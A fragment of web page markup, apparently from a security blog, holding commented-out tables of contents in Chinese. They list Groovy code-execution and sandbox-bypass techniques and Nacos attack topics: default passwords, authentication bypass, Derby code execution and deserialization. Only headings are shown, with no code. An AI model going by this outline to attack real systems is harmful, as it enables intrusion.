toc-level-3"><a class="toc-link" href="#o2xDW"><span class="toc-text">GroovyScripteEngine</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#YsSeR"><span class="toc-text">本地文件加载脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tIaRE"><span class="toc-text">远程URL加载脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fOpXr"><span class="toc-text">GroovyScriptEvaluator</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ZQfkG"><span class="toc-text">使用StaticScriptEvaluator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#n2Fm4"><span class="toc-text">使用ResourceScript</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sYoCe"><span class="toc-text">GroovyClassLoader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RBnlK"><span class="toc-text">ScriptEngine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gLuK7"><span class="toc-text">其他利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#zugFf"><span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AvpCE"><span class="toc-text">文件写入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OF9jY"><span class="toc-text">绕过沙箱</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ZoTyg"><span class="toc-text">Java反射Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rznvT"><span class="toc-text">@AST注解执行恶意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIjkd"><span class="toc-text">@Grab注解加载远程恶意类</span></a></li></ol></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Qp5ba"><span class="toc-text">Nacos指纹信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lnl1S"><span class="toc-text">Nacos历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#U9VlG"><span class="toc-text">版本信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#N7lVg"><span class="toc-text">默认密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iddcj"><span class="toc-text">鉴权绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IoRkC"><span class="toc-text">默认未开启鉴权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ZMhD3"><span class="toc-text">User-Agent权限绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ULj2F"><span class="toc-text">默认JWT密钥</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XRV1a"><span class="toc-text">Derby未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mQhgX"><span class="toc-text">DerbySQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#s29hq"><span class="toc-text">Derby任意代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ocYNK"><span class="toc-text">出网情况下</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#gafqF"><span class="toc-text">不出网情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#XNPii"><span class="toc-text">基于PROCEDURE的不出网利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#wvH8G"><span class="toc-text">基于FUNCTION的不出网利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#T8ail"><span class="toc-text">不出网-无文件落地</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c7COA"><span class="toc-text">其他漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#YqjCL"><span class="toc-text">NacosSnakeYaml反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PI7bg"><span class="toc-text">NacosHessian反序列化</span></a></li></ol></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
